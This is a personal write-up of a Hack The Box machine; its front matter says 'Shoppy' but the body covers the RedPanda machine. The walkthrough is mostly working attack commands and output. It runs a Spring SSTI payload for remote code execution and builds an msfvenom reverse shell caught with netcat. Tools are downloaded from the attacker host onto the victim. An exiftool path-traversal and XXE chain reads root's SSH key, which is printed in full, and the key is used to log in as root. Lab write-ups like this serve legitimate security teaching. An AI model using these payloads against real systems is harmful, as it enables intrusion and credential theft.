author = ['Abdallah Adham']
title = "Shoppy HTB Writeup"
date = 2022-11-16
description = "This is a writeup of the Shoppy machine in Hack The Box platform."
draft = false
slug = ""

tags = [
	'HackTheBox',
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/RedPanda_HTB/redpanda_htb.jpg"
+++

---

## Scanning

### Nmap

```bash
$ nmap -A -T4 -p- -oN nmap.txt 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http-proxy
|_http-title: Red Panda Search | Made with Spring Boot 
```

## Enumeration

### Directory Enumeration

```bash
$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://redpanda.htb:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://redpanda.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
search                  [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 91ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 140ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 210ms]
# Copyright 2007 James Fisher [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 210ms]
stats                   [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 81ms]
error                   [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 91ms]
```

I have found 2 directories which are _stats_ and _error_ but they have nothing we have do about them.

but in stats we see that there are images for two authors that may help us.

![stats](post/RedPanda_HTB/imgs/RedPanda/1.JPG)

By looking at the author **"woodenk"**, There are some images and every time you view one of them, It increases the number of views by 1 and so on.

![images](post/RedPanda_HTB/imgs/RedPanda/2.JPG)

But, Nothing else is important!

Lets go back to the home page and search on one of those images!

### Web Enumeration

Let's see what is the first thing we see when we open the website?

![home_page](post/RedPanda_HTB/imgs/RedPanda/3.JPG)

Now, Let's search on **"greg"** and see what are the results?

![search](post/RedPanda_HTB/imgs/RedPanda/4.JPG)

Okay, This is a little hint i think so!

After a lot of injections, such as **XSS, LFI, SQLi and SSRF** nothing worked .. But one thing which is **SSTI**.

## Exploitation

### Server Side Template Injection (SSTI)

#### Detect

I have tried a lot of payloads to detect if the server is vulnerable or not.

```text
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

The only two payloads that worked with me are: `#{7*7} and *{7*7}`.

![ssti1](post/RedPanda_HTB/imgs/RedPanda/5.JPG)

![ssti2](post/RedPanda_HTB/imgs/RedPanda/6.JPG)


#### Identify

After a lot of searching i have fount that the template engine is called **Spring Framework (Java)**

#### Exploit

I have found that article from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), It talks about everything of **SSTI** from detection to exploitation .. Check it out!

From it, I have found a payload which makes me get an **RCE**!

Let's start by getting the **id** command:
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

![id](post/RedPanda_HTB/imgs/RedPanda/7.JPG)

Now, I have initalize a **listener** and get a **Reverse Shell**!

1. Initialize a **Listener**:
```bash
$ nc -nlvp 4444
listening on [any] 4444 ...
```

2. Spawn a Reverse shell payload using **MsVenom**:
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.X.X LPORT=4444 -f elf -o reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: reverse.elf
```

3. Initialize a Python server:
```bash
$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

4. Upload the Reverse shell payload at the victim's machine:
![rce1](post/RedPanda_HTB/imgs/RedPanda/8.JPG)

5. Make sure the payload is stored there.
![rce2](post/RedPanda_HTB/imgs/RedPanda/9.png)

So, It is uploaded successfully!

6. Give the payload the permissions to be executed:
![rce3](post/RedPanda_HTB/imgs/RedPanda/10.png)

7. Make sure it has the execution permissions:
![rce4](post/RedPanda_HTB/imgs/RedPanda/11.png)

8. Run the payload:
![rce5](post/RedPanda_HTB/imgs/RedPanda/12.png)

9. Lastly, Recieve the Reverse Shell:
![rce6](post/RedPanda_HTB/imgs/RedPanda/13.png)

Then, We spawn **TTY** and make our Revshell as **interactive** as possible.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^Z
zsh: suspended  nc -nlvp 4444          
└─$  stty raw -echo ; fg 
[1]  + continued  nc -nlvp 4444
woodenk@redpanda:/tmp/hsperfdata_woodenk$
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm
```

Now, You have the most interactive shell you can have with auto-complete and no interruptions.

Back to our mission, Let's go and grap the user.txt.

```bash
woodenk@redpanda:/home/woodenk$ cat user.txt
74e9066ca96ac03b9eXXXXXXXXXXXXX
```

## Post-Exploitation

### linpeas.sh

Firstly, We initialize a Python server in order to send **linpeas.sh** to the victim machine.

```bash
$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

Then, At the victim machine we go the **/tmp** folder and download the script.

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ wget http://10.10.16.34:9000/linpeas.sh
--2022-11-15 18:12:02--  http://10.10.16.34:9000/linpeas.sh
Connecting to 10.10.16.34:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.42K   240KB/s    in 3.4s    

2022-11-15 18:12:06 (240 KB/s) - ‘linpeas.sh’ saved [827827/827827]
woodenk@redpanda:/tmp/hsperfdata_woodenk$ chmod +x linpeas.sh 
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ./linpeas.sh
```

Apparently, Nothing i have got from **linpeas.sh**.

### id

So, by looking at the result of  the **id** command, We can see that we are belonging to a group called **logs**!

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

Which is very interesting because we dont know what is this group and maybe it is our way to get the **root** privilage.

So, Let's find everything under the permission of that group:

```bash
woodenk@redpanda:/tmp/hsperfdata_woodenk$ find / -group logs 2>/dev/null
/opt/panda_search/redpanda.log
```

Let's run **pspy64** and see what processes are running in the background.


```bash
woodenk@redpanda:/tmp$ wget 10.10.16.34:9000/pspy64
--2022-11-16 14:23:41--  http://10.10.X.X:9000/pspy64
Connecting to 10.10.16.34:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4468984 (4.3M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   4.26M   268KB/s    in 16s     

2022-11-16 14:23:57 (275 KB/s) - ‘pspy64’ saved [4468984/4468984]
woodenk@redpanda:/tmp/hsperfdata_woodenk$ chmod +x pspy64 
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ./pspy64
---------------------------------------------------------------------
2022/11/16 14:26:01 CMD: UID=0    PID=7093   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
---------------------------------------------------------------------
```

There is a **JAR** file being executed as **root (UID=0)**, Which i have to investigate about and see what is does.

Let's transfer it to our attacker machine and see how does it work?

```bash
$ wget http://redpanda.htb:9000/final-1.0-jar-with-dependencies.jar                      
--2022-11-16 09:33:00--  http://redpanda.htb:9000/final-1.0-jar-with-dependencies.jar
Resolving redpanda.htb (redpanda.htb)... 10.10.11.170
Connecting to redpanda.htb (redpanda.htb)|10.10.11.170|:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1280956 (1.2M) [application/java-archive]
Saving to: ‘final-1.0-jar-with-dependencies.jar’

final-1.0-jar-with-dependenci 100%[===============================================>]   1.22M   714KB/s    in 1.8s    

2022-11-16 09:33:02 (714 KB/s) - ‘final-1.0-jar-with-dependencies.jar’ saved [1280956/1280956]
```

I have used a tool called **"jd-gui"** that is used to displays Java source codes.

By running the JAR file called **"final-1.0-jar-with-dependencies.jar"** we can see in the **main()** class:

![jar](post/RedPanda_HTB/imgs/RedPanda/14.png)

```java
public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }
}
```

We can see that the **redpanda.log** file will be read line by line and there are some conditions for the image to be passed:

1. The line must contain **.jpg** as the extension of the image.
```java
public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
  }
```

2. The line will be splitted with the delimiter as "**||**" and the below attributes will be set to each part of the line.
```java
public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
```

3. The Author's tag metadata of the image file must be matched with **`/credits/<author_name>_creds.xml`**
```java
public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for (Directory dir : metadata.getDirectories()) {
      for (Tag tag : dir.getTags()) {
        if (tag.getTagName() == "Artist")
          return tag.getDescription(); 
      } 
    } 
    return "N/A";
  }
```

4. The image file must be in a folder that has a WRITE access such as **/tmp**
```java
public static void addViewTo(String path, String uri) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());
    File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
  }
```

Now, We are going to make our exploit that includes the **.jpg** and **.xml** files.

Let's begin with the **.jpg** file:

1. I have got a random image and removed all its metadata using **exiftool**.
```bash
$ exiftool -all= jpg_exploit.jpg 
Warning: ICC_Profile deleted. Image colors may be affected - jpg_exploit.jpg
    1 image files updated                                                                           
└─$ exiftool jpg_exploit.jpg      
ExifTool Version Number         : 12.49
File Name                       : jpg_exploit.jpg
Directory                       : .
File Size                       : 4.9 MB
File Modification Date/Time     : 2022:11:16 10:31:34-05:00
File Access Date/Time           : 2022:11:16 10:31:34-05:00
File Inode Change Date/Time     : 2022:11:16 10:31:34-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Image Width                     : 6720
Image Height                    : 4480
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 6720x4480
Megapixels                      : 30.1
```

2. Now we add the Artist tag with a path of directory that has a WRITE access.
```bash
$ exiftool -Artist="../tmp/pwn" jpg_exploit.jpg 
    1 image files updated     
└─$ exiftool jpg_exploit.jpg                     
ExifTool Version Number         : 12.49
File Name                       : jpg_exploit.jpg
Directory                       : .
File Size                       : 4.9 MB
File Modification Date/Time     : 2022:11:16 10:32:33-05:00
File Access Date/Time           : 2022:11:16 10:32:33-05:00
File Inode Change Date/Time     : 2022:11:16 10:32:33-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : ../tmp/pwn
Y Cb Cr Positioning             : Centered
Image Width                     : 6720
Image Height                    : 4480
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 6720x4480
Megapixels                      : 30.1
```

3. Finally, Send the **.jpg** file to victim's tmp directory.

Now, We go for the **.xml** file:

1. We construct the **.xml** as the ones the already exist to avoid any confliction in the structure.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>woodenk</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>1</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>1</totalviews>
</credits>
```

2. We create our **pwn_creds.xml** and we will use **XML Entity Expansion (XXE)** to inject a payload that can print the private ssh credientials of root.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>pwn</author>
  <image>
    <uri>/../../../../../../tmp/jpg_exploit.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>1</totalviews>
</credits>
```

3. Then, Send the below string to **/opt/panda_search/redpanda.log**.
```bash
echo "222||a||a||/../../../../../../tmp/jpg_exploit.jpg" > /opt/panda_search/redpanda.log
```

Now, It is time to get the SSH key of the root:

1. View the **/tmp/jpg_creds.xml** to see the root's private SSH key in it.
```bash
woodenk@redpanda:/tmp$ cat /tmp/jpg_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>pwn</author>
  <image>
    <uri>/../../../../../../tmp/jpg_exploit.jpg</uri>
    <views>1</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>1</totalviews>
</credits>
```

2. Store it in any text file and change its permissions.
```bash
$ chmod 600 ssh_key.txt
```

3. Connect to the victim's machine using SSH with root privilages.
```bash
$ ssh -i ssh_key.txt root@10.10.11.170
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
root@redpanda:~# cat root.txt 
0c9a981760e9e26XXXXXXXXXXXXXX
```

_Pwned_
![pwned](post/RedPanda_HTB/imgs/RedPanda/15.png)

